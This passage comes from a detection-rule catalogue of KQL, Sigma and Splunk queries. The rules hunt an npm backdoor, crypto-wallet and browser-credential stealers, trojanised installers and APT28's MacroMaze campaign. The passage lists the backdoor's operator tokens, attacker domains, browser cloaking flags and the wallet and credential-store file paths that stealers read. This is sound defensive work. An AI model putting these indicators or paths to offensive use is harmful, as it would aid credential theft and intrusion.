| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, InitiatingProcessFolderPath
| order by Timestamp desc

   | where CommandLine has_any ("jsonfb","jsonfx") or CommandLine contains "json-bigint-extend"
   | project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName),
  (ImProcessCreate
   | where TimeGenerated > ago(30d)
   | where ActorUsername !endswith "$"
   | where TargetProcessName has_any ("npm","node","yarn","pnpm","npx") or ParentProcessName has_any ("npm","node","yarn","pnpm","npx")

[LLM] Inbound HTTP request bearing sidoraress backdoor x-operation operator tokens Command & Control High
Detects requests to internal Node.js services carrying the four 20-character secret tokens that gate the json-bigint-extend backdoor's RunSQL / RunFileList / RunFileContent / CompressDownload commands. Because the backdoor monkey-patches express.Route.prototype.post and inspects an x-operation header on every POST, any request bearing one of these tokens is a confirmed operator interaction with a planted backdoor. Rationale: The four 20-character base62 tokens are listed verbatim as IOCs in the Aikido article, one per operator command (RunSQL / RunFileList / RunFileContent / CompressDownload). They are random enough that any appearance in HTTP logs is a confirmed inbound operator request against a backdoored Node.js Express app — there is no legitimate scenario where these strings would appear. Defender XDR has no native HTTP-header telemetry, so defender_kql is intentionally empty; detection lives in web-tier logs. Cross-checked against: • https://www.aikido.dev/blog/npm-backdoor-lets-hackers-hijack-gambling-outcomes
ATT&CKT1071.001 T1505.003 T1005
Data sourcesWeb.Web
let _tokens = dynamic(["cfh2DNITa84qpYQ0tdCz","m3QiEkg8Y1r9LFTI5e4f","Y3SrZjVqWOvKsBdpTCh7","SJQf31UJkZ1f88q9m361"]);
union isfuzzy=true
  (W3CIISLog
   | where TimeGenerated > ago(30d)
   | where csUriQuery has_any (_tokens) or csUriStem has_any (_tokens) or csUserAgent has_any (_tokens) or csReferer has_any (_tokens)
   | project TimeGenerated, Computer, cIP, csMethod, csUriStem, csUriQuery, csUserAgent, scStatus),
  (CommonSecurityLog
   | where TimeGenerated > ago(30d)
   | where Message has_any (_tokens) or RequestURL has_any (_tokens) or RequestClientApplication has_any (_tokens)
         or DeviceCustomString1 has_any (_tokens) or DeviceCustomString2 has_any (_tokens) or DeviceCustomString3 has_any (_tokens)
         or DeviceCustomString4 has_any (_tokens) or DeviceCustomString5 has_any (_tokens) or DeviceCustomString6 has_any (_tokens)
   | project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, DestinationIP, RequestURL, RequestMethod, Message),
  (ImWebSession
   | where TimeGenerated > ago(30d)
   | where Url has_any (_tokens) or UrlOriginal has_any (_tokens) or HttpRequestHeaderUserAgent has_any (_tokens) or HttpRequestHeaderReferer has_any (_tokens)
   | project TimeGenerated, SrcIpAddr, DstHostname, HttpMethod, Url, HttpStatusCode, HttpRequestHeaderUserAgent),
  (AppServiceHTTPLogs
   | where TimeGenerated > ago(30d)
   | where CsUriQuery has_any (_tokens) or CsUriStem has_any (_tokens) or UserAgent has_any (_tokens) or Referer has_any (_tokens)
   | project TimeGenerated, CsHost, CIp, CsMethod, CsUriStem, CsUriQuery, ScStatus, UserAgent)
| order by TimeGenerated desc
title: HTTP Request with sidoraress Gambling Backdoor x-operation Token
id: 7c9d3e4f-5a6b-48c7-9d8e-2b3a4f5c6e7d
status: experimental
description: Detects inbound HTTP requests whose URI, headers, or referer carry one of the four secret operator tokens (cfh2DNITa84qpYQ0tdCz, m3QiEkg8Y1r9LFTI5e4f, Y3SrZjVqWOvKsBdpTCh7, SJQf31UJkZ1f88q9m361) used by the json-bigint-extend backdoor to authenticate RunSQL/RunFileList/RunFileContent/CompressDownload commands against compromised Express apps.
references:
  - https://www.aikido.dev/blog/npm-backdoor-lets-hackers-hijack-gambling-outcomes
author: SOC Detection Engineering
date: 2026/05/13
tags:
  - attack.command_and_control
  - attack.t1071.001
  - attack.persistence
  - attack.t1505.003
  - attack.collection
  - attack.t1005
logsource:
  category: webserver
detection:
  selection_uri:
    cs-uri-query|contains:
      - 'cfh2DNITa84qpYQ0tdCz'
      - 'm3QiEkg8Y1r9LFTI5e4f'
      - 'Y3SrZjVqWOvKsBdpTCh7'
      - 'SJQf31UJkZ1f88q9m361'
  selection_ua:
    cs-user-agent|contains:
      - 'cfh2DNITa84qpYQ0tdCz'
      - 'm3QiEkg8Y1r9LFTI5e4f'
      - 'Y3SrZjVqWOvKsBdpTCh7'
      - 'SJQf31UJkZ1f88q9m361'
  selection_ref:
    cs-referer|contains:
      - 'cfh2DNITa84qpYQ0tdCz'
      - 'm3QiEkg8Y1r9LFTI5e4f'
      - 'Y3SrZjVqWOvKsBdpTCh7'
      - 'SJQf31UJkZ1f88q9m361'
  condition: selection_uri or selection_ua or selection_ref
falsepositives:
  - None expected; tokens are 20-character random strings with no legitimate use
level: critical
(source:(nginx OR apache OR windows.iis OR cloudwatch_logs OR aws.elb OR aws.cloudfront OR azure.appservice)) (@http.url:(*cfh2DNITa84qpYQ0tdCz* OR *m3QiEkg8Y1r9LFTI5e4f* OR *Y3SrZjVqWOvKsBdpTCh7* OR *SJQf31UJkZ1f88q9m361*) OR @http.useragent:(*cfh2DNITa84qpYQ0tdCz* OR *m3QiEkg8Y1r9LFTI5e4f* OR *Y3SrZjVqWOvKsBdpTCh7* OR *SJQf31UJkZ1f88q9m361*) OR @http.referer:(*cfh2DNITa84qpYQ0tdCz* OR *m3QiEkg8Y1r9LFTI5e4f* OR *Y3SrZjVqWOvKsBdpTCh7* OR *SJQf31UJkZ1f88q9m361*) OR @http.request_headers.x_operation:(cfh2DNITa84qpYQ0tdCz OR m3QiEkg8Y1r9LFTI5e4f OR Y3SrZjVqWOvKsBdpTCh7 OR SJQf31UJkZ1f88q9m361))
WEB
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime values(Web.url) as urls values(Web.http_method) as methods values(Web.http_user_agent) as uas from datamodel=Web.Web where (Web.url="*cfh2DNITa84qpYQ0tdCz*" OR Web.url="*m3QiEkg8Y1r9LFTI5e4f*" OR Web.url="*Y3SrZjVqWOvKsBdpTCh7*" OR Web.url="*SJQf31UJkZ1f88q9m361*" OR Web.http_user_agent="*cfh2DNITa84qpYQ0tdCz*" OR Web.http_user_agent="*m3QiEkg8Y1r9LFTI5e4f*" OR Web.http_user_agent="*Y3SrZjVqWOvKsBdpTCh7*" OR Web.http_user_agent="*SJQf31UJkZ1f88q9m361*") by Web.src Web.dest Web.url Web.http_method Web.http_user_agent
| `drop_dm_object_name(Web)`
| append [
  search (sourcetype=nginx* OR sourcetype=apache* OR sourcetype=iis* OR sourcetype=*waf* OR sourcetype=*cef* OR tag=web)
    ("cfh2DNITa84qpYQ0tdCz" OR "m3QiEkg8Y1r9LFTI5e4f" OR "Y3SrZjVqWOvKsBdpTCh7" OR "SJQf31UJkZ1f88q9m361")
  | stats count min(_time) as firstTime max(_time) as lastTime by host src sourcetype uri http_method
]
| convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Web.url) as urls values(Web.http_method) as methods values(Web.http_user_agent) as uas from datamodel=Web.Web where (Web.url="*cfh2DNITa84qpYQ0tdCz*" OR Web.url="*m3QiEkg8Y1r9LFTI5e4f*" OR Web.url="*Y3SrZjVqWOvKsBdpTCh7*" OR Web.url="*SJQf31UJkZ1f88q9m361*" OR Web.http_user_agent="*cfh2DNITa84qpYQ0tdCz*" OR Web.http_user_agent="*m3QiEkg8Y1r9LFTI5e4f*" OR Web.http_user_agent="*Y3SrZjVqWOvKsBdpTCh7*" OR Web.http_user_agent="*SJQf31UJkZ1f88q9m361*") by Web.src Web.dest Web.url Web.http_method Web.http_user_agent
| `drop_dm_object_name(Web)`
| append [
  search (sourcetype=nginx* OR sourcetype=apache* OR sourcetype=iis* OR sourcetype=*waf* OR sourcetype=*cef* OR tag=web)
    ("cfh2DNITa84qpYQ0tdCz" OR "m3QiEkg8Y1r9LFTI5e4f" OR "Y3SrZjVqWOvKsBdpTCh7" OR "SJQf31UJkZ1f88q9m361")
  | stats count min(_time) as firstTime max(_time) as lastTime by host src sourcetype uri http_method
]
| convert ctime(firstTime) ctime(lastTime)
Crypto-wallet file/keystore access by non-wallet process Actions on Objectives High
Stealers / wallet drainers read keystore.json, MetaMask, Exodus, Atomic, Phantom data.
ATT&CKT1005
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Ethereum\keystore\", @"\Bitcoin\", @"\Exodus\", @"\Electrum\wallets\", @"\MetaMask\", @"\Phantom\", @"\Atomic\Local Storage\")
| where InitiatingProcessFileName !in~ ("MetaMask.exe","Exodus.exe","Atomic.exe","electrum.exe","Bitcoin.exe","Phantom.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Ethereum\keystore\", @"\Bitcoin\",
                                  @"\Exodus\", @"\Electrum\wallets\",
                                  @"\MetaMask\", @"\Phantom\",
                                  @"\Atomic\Local Storage\")
| where ActingProcessName !in~ ("MetaMask.exe","Exodus.exe","Atomic.exe",
                                  "electrum.exe","Bitcoin.exe","Phantom.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Crypto-Wallet Keystore Access by Non-Wallet Process
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d02
status: experimental
description: |
    Stealers / wallet drainers read keystore files from MetaMask,
    Exodus, Atomic, Phantom, Bitcoin, Electrum, Ethereum-cli wallets.
    Filtering out the legitimate wallet binaries leaves only attacker
    activity.
references:
    - https://attack.mitre.org/techniques/T1005/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1005
    - attack.collection
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Ethereum\keystore\'
            - '\Bitcoin\'
            - '\Exodus\'
            - '\Electrum\wallets\'
            - '\MetaMask\'
            - '\Phantom\'
            - '\Atomic\Local Storage\'
    filter_legit:
        Image|endswith:
            - '\MetaMask.exe'
            - '\Exodus.exe'
            - '\Atomic.exe'
            - '\electrum.exe'
            - '\Bitcoin.exe'
            - '\Phantom.exe'
    condition: selection_path and not filter_legit
falsepositives:
    - Backup software
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Ethereum\keystore\*"
        OR Filesystem.file_path="*\Bitcoin\wallet.dat"
        OR Filesystem.file_path="*\Exodus\exodus.wallet*"
        OR Filesystem.file_path="*\Electrum\wallets\*"
        OR Filesystem.file_path="*\MetaMask\*"
        OR Filesystem.file_path="*\Phantom\*"
        OR Filesystem.file_path="*\Atomic\Local Storage\*")
      AND NOT Filesystem.process_name IN ("MetaMask.exe","Exodus.exe","Atomic.exe","electrum.exe","Bitcoin.exe","Phantom.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Ethereum\keystore\*"
        OR Filesystem.file_path="*\Bitcoin\wallet.dat"
        OR Filesystem.file_path="*\Exodus\exodus.wallet*"
        OR Filesystem.file_path="*\Electrum\wallets\*"
        OR Filesystem.file_path="*\MetaMask\*"
        OR Filesystem.file_path="*\Phantom\*"
        OR Filesystem.file_path="*\Atomic\Local Storage\*")
      AND NOT Filesystem.process_name IN ("MetaMask.exe","Exodus.exe","Atomic.exe","electrum.exe","Bitcoin.exe","Phantom.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("") or RemoteUrl has_any ("payment.y1pay.vip", "payment.snip-site.cc", "gameland.21game.live", "gameland.myapptest.top", "gameland.nbzysp1.com", "gali.web.test.myapptest.top")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic([""]);
let BadDomains = dynamic(["payment.y1pay.vip", "payment.snip-site.cc", "gameland.21game.live", "gameland.myapptest.top", "gameland.nbzysp1.com", "gali.web.test.myapptest.top"]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

Article-specific behavioural hunt — npm backdoor lets hackers hijack gambling outcomes Exploitation High
Auto-generated hunt targeting the specific binaries, paths, registry locations and command-line fragments named in this article. Hunting tier — needs analyst review and environment tuning before promotion to alerting.
ATT&CKT1204.002
Data sourcesEndpoint.Processes Endpoint.Filesystem Endpoint.Registry
// Article-specific bespoke detection — npm backdoor lets hackers hijack gambling outcomes
// Hunts the actual binaries / paths / commandline fragments named
// in the article instead of a generic technique-class template.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (FileName in~ ("express.js"))
| project Timestamp, DeviceName, AccountName, FileName,
          FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc

// File-creation events for the named binaries / paths
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified")
| where (FileName in~ ("express.js"))
| project Timestamp, DeviceName, AccountName, FolderPath,
          FileName, ActionType, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
``` Article-specific bespoke detection — npm backdoor lets hackers hijack gambling outcomes ```
| tstats `summariesonly` count earliest(_time) AS firstTime latest(_time) AS lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process_name IN ("express.js"))
    by Processes.dest, Processes.user, Processes.process_name,
       Processes.process, Processes.parent_process_name, Processes.process_path
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)`
| append [
| tstats `summariesonly` count
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("created","modified")
      AND (Filesystem.file_name IN ("express.js"))
    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
       Filesystem.file_path, Filesystem.file_name
| `drop_dm_object_name(Filesystem)`
]

    by Processes.dest, Processes.user, Processes.process_name,
       Processes.process, Processes.parent_process_name, Processes.process_path
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)`
| append [
| tstats summariesonly=false count
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("created","modified")
      AND (Filesystem.file_name IN ("express.js"))
    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
       Filesystem.file_path, Filesystem.file_name
| `drop_dm_object_name(Filesystem)`
]
Critical

Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).

Exploitation. Installation. Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] APT28 MacroMaze: Edge launched off-screen or headless to webhook.site by non-browser parent · [LLM] APT28 MacroMaze: Office or Edge HTTP traffic to webhook.site (INCLUDEPICTURE tracker + exfil) · Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs
[LLM] APT28 MacroMaze: Edge launched off-screen or headless to webhook.site by non-browser parent Command & Control High
Hunts the MacroMaze Stage-2 batch behaviour where msedge.exe is launched by cmd.exe/wscript.exe with the article's specific cloaking flags (--window-size=1,1 --window-position=10000,10000, --headless=new, or --ignore-certificate-errors) and navigates to a webhook[.]site URL used as both payload broker and exfil endpoint. The off-screen positioning combined with webhook.site is a near-deterministic indicator of this campaign. Rationale: Uses the article's verbatim Edge cloaking flags (--window-position=10000,10000, --window-size=1,1, --headless=new, --ignore-certificate-errors) plus the webhook.site C2/exfil host. The combination of msedge.exe spawned by cmd.exe/wscript.exe with these specific flags is essentially unique to MacroMaze. Cross-checked against: • https://thehackernews.com/2026/02/apt28-targeted-european-entities-using.html • https://securityaffairs.com/188421/apt/operation-macromaze-apt28-exploits-webhooks-for-covert-data-exfiltration.html • https://socprime.com/active-threats/operation-macromaze/ • https://attack.mitre.org/groups/G0007/
ATT&CKT1564.003 T1102 T1567 T1218
Data sourcesEndpoint.Processes Network_Traffic.All_Traffic
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "msedge.exe"
| where InitiatingProcessFileName in~ ("cmd.exe","wscript.exe","cscript.exe")
| where AccountName !endswith "$"
| where ProcessCommandLine has_any ("--window-position=10000,10000","--window-size=1,1","--headless=new","--ignore-certificate-errors")
   or ProcessCommandLine has "webhook.site"
| where ProcessCommandLine has "webhook.site"
   or InitiatingProcessFolderPath has_any (@"\Users\", @"\AppData\", @"\Downloads\")
| project Timestamp, DeviceName, AccountName,
          Parent = InitiatingProcessFileName,
          ParentCmd = InitiatingProcessCommandLine,
          ParentPath = InitiatingProcessFolderPath,
          ChildCmd = ProcessCommandLine,
          SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where NewProcessName endswith "msedge.exe"
| where ParentProcessName endswith "cmd.exe" or ParentProcessName endswith "wscript.exe" or ParentProcessName endswith "cscript.exe"
| where Account !endswith "$"
| where CommandLine has_any ("--window-position=10000,10000","--window-size=1,1","--headless=new","--ignore-certificate-errors")
   or CommandLine has "webhook.site"
| project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

[LLM] APT28 MacroMaze: schtasks creating wscript-launched persistence with 20/30/61-minute repeat Installation High
Catches the MacroMaze persistence routine where the CMD dropper writes a Task XML to disk and imports it via schtasks.exe to run a wscript.exe wrapper from %USERPROFILE% taking a .bat as argument. The article's two batch variants set repetition intervals of PT20M, PT30M and PT61M — atypical scheduled-task cadences that combined with the wscript+bat-arg shape are high-fidelity. Rationale: Anchored on the article's specific persistence chain: schtasks /create /xml registering a wscript.exe wrapper that takes a .bat/.cmd argument located in %USERPROFILE%. The PT20M/PT30M/PT61M repetition intervals are exact strings from the campaign and surface as a bonus enrichment, while the structural wscript+bat-arg shape carries the alert. Cross-checked against: • https://thehackernews.com/2026/02/apt28-targeted-european-entities-using.html • https://socprime.com/active-threats/operation-macromaze/ • https://attack.mitre.org/techniques/T1053/005/
ATT&CKT1053.005 T1059.005 T1059.003
Data sourcesEndpoint.Processes
// Direct schtasks creation observed by MacroMaze CMD
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has_any ("/create","/xml")
| where ProcessCommandLine has "wscript"
| where ProcessCommandLine has_any (@"\Users\", "%USERPROFILE%", @"\AppData\")
| where ProcessCommandLine matches regex @"(?i)\.(bat|cmd)\b"
| extend SuspiciousInterval = iff(ProcessCommandLine has_any ("PT20M","PT30M","PT61M","/RI 20","/RI 30","/RI 61"), true, false)
| project Timestamp, DeviceName, AccountName,
          Parent = InitiatingProcessFileName,
          ParentCmd = InitiatingProcessCommandLine,
          ChildCmd = ProcessCommandLine,
          SuspiciousInterval
| order by Timestamp desc
// SecurityEvent 4688 + 4698 — process creation + task XML registration
(SecurityEvent
| where TimeGenerated > ago(14d)
| where EventID == 4688
| where NewProcessName endswith "schtasks.exe"
| where Account !endswith "$"
| where CommandLine has_any ("/create","/xml")
| where CommandLine has "wscript"
| where CommandLine matches regex @"(?i)\.(bat|cmd)\b"
| project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine, Source="4688")
| union (
SecurityEvent
| where TimeGenerated > ago(14d)
| where EventID == 4698                       // a scheduled task was created
| where EventData has "wscript"
| where EventData matches regex @"(?i)PT(20|30|61)M"
| project TimeGenerated, Computer, Account = SubjectUserName, EventData, Source="4698")
| order by TimeGenerated desc

[LLM] APT28 MacroMaze: Office or Edge HTTP traffic to webhook.site (INCLUDEPICTURE tracker + exfil) Command & Control Medium
Hunts every leg of the MacroMaze webhook.site abuse: WINWORD.EXE fetching docopened.jpg via the INCLUDEPICTURE tracker, and msedge.exe POSTing the auto-submitted exfil HTML. Either is anomalous in a corporate environment because webhook.site is an ephemeral developer-debugging service that has no business consuming Office or Edge traffic from end-user hosts. Rationale: webhook.site is the article's pivot point — used both for the INCLUDEPICTURE "document opened" beacon (docopened.jpg) and for the auto-submitting HTML exfil POST. Pinning the source process to Office, script hosts or Edge avoids dev-team false positives. Sigma omitted because the rule is a multi-process / cross-table union that doesn't fit a single selection block. Cross-checked against: • https://thehackernews.com/2026/02/apt28-targeted-european-entities-using.html • https://securityaffairs.com/188421/apt/operation-macromaze-apt28-exploits-webhooks-for-covert-data-exfiltration.html • https://socprime.com/active-threats/operation-macromaze/ • https://attack.mitre.org/groups/G0007/
ATT&CKT1102 T1567.002 T1566.001 T1221
Data sourcesNetwork_Traffic.All_Traffic Web
DeviceNetworkEvents
| where Timestamp > ago(14d)
| where RemoteUrl has "webhook.site" or RemoteUrl endswith ".webhook.site"
| where InitiatingProcessFileName in~ (
    "winword.exe","excel.exe","powerpnt.exe",
    "msedge.exe","wscript.exe","cscript.exe","cmd.exe")
| extend Indicator = case(
    RemoteUrl has "docopened.jpg", "INCLUDEPICTURE_tracker",
    InitiatingProcessFileName =~ "winword.exe", "Office_to_webhook.site",
    InitiatingProcessFileName =~ "msedge.exe", "Edge_exfil_or_payload",
    "Script_host_to_webhook.site")
| project Timestamp, DeviceName,
          Account = InitiatingProcessAccountName,
          Process = InitiatingProcessFileName,
          ProcessCmd = InitiatingProcessCommandLine,
          RemoteIP, RemotePort, RemoteUrl, Indicator
| order by Timestamp desc
// Prefer ASIM ImWebSession; fall back to CommonSecurityLog for proxy logs
let webhook_hits = ImWebSession
    | where TimeGenerated > ago(14d)
    | where Url has "webhook.site" or HttpHostName has "webhook.site"
    | where ActingProcessName has_any (
        "winword.exe","excel.exe","powerpnt.exe",
